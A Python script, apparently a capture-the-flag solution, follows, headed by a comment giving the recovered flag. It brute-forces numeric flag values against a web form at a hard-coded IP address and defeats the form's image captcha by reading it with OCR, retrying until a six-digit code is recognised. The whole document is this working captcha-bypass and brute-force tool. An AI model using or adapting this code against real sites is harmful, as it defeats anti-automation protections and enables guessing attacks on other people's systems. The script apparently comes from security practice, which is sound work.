#Wonderful ! F L A G - 2 {4_l1ttl3_h4rder}



import requests
from PIL import Image
from io import BytesIO
import pytesseract
import re
from bs4 import BeautifulSoup
import logging
import time

# Logger setup
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logging.success = lambda msg: print(f"\033[92m[SUCCESS]\033[0m {msg}")

# URL settings
BASE_URL = "http://31.220.95.27:9002"
CAPTCHA_IMAGE_URL = f"{BASE_URL}/captcha.php"
FORM_URL = f"{BASE_URL}/captcha2/"

# Headers copied from Burp
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:138.0) Gecko/20100101 Firefox/138.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Referer": FORM_URL,
    "Origin": BASE_URL,
    "Content-Type": "application/x-www-form-urlencoded",
}

def solve_captcha(session):
    """Essaye de résoudre un captcha et retourne le code s’il est valide (6 caractères)"""
    for _ in range(50):
        session.get(FORM_URL)  # init session
        r = session.get(CAPTCHA_IMAGE_URL)
        image = Image.open(BytesIO(r.content))
        raw_text = pytesseract.image_to_string(image, config='--psm 8')
        match = re.search(r'[0-9]{6}', raw_text)
        if match:
            captcha_code = match.group()
            logging.info(f"Captcha détecté : {captcha_code}")
            return captcha_code
        # logging.warning(f"Captcha illisible : '{raw_text.strip()}'. Nouvelle tentative...")
    raise Exception("Échec de lecture captcha après plusieurs essais.")

def try_flag(session, flag):
    captcha = solve_captcha(session)
    data = {
        "flag": str(flag),
        "captcha": captcha,
        "submit": "Submit Query"
    }
    response = session.post(FORM_URL, headers=HEADERS, data=data)
    html = response.text

    # Extraire uniquement ce qui est après la balise </form>
    after_form = html.split("</form>")[-1]

    if "wonderful" in after_form.lower():
        logging.success(f"Flag TROUVÉ : {flag} (captcha {captcha})")
        return True

    # Vérifie s’il y a un code captcha de 5 ou 6 caractères
    match = re.search(r'([a-zA-Z0-9]{5,6})\s*</div>', after_form)
    if not match and "wonderful" not in after_form.lower():
        print(after_form.lower())
        logging.warning("⚠️ Aucun code captcha détecté dans la réponse. Ignoré.")
        return False

    code = match.group(1)
    if len(code) < 6:
        logging.info(f"Captcha rejeté : {code}. Flag {flag} ignoré.")
        return False
    # print(after_form.lower())
    if "wonderful" in after_form.lower():
        logging.success(f"Flag TROUVÉ : {flag} (captcha {captcha}, retour : {code})")
        return True
    else:
        logging.info(f"Flag {flag} invalide. Captcha {captcha}, retour : {code}")
        return False


def main():
    session = requests.Session()

    for flag in range(2750, 2760):
        try:
            if try_flag(session, flag):
                break
        except Exception as e:
            logging.error(f"Erreur lors du test du flag {flag}: {e}")
            time.sleep(1)

if __name__ == "__main__":
    main()
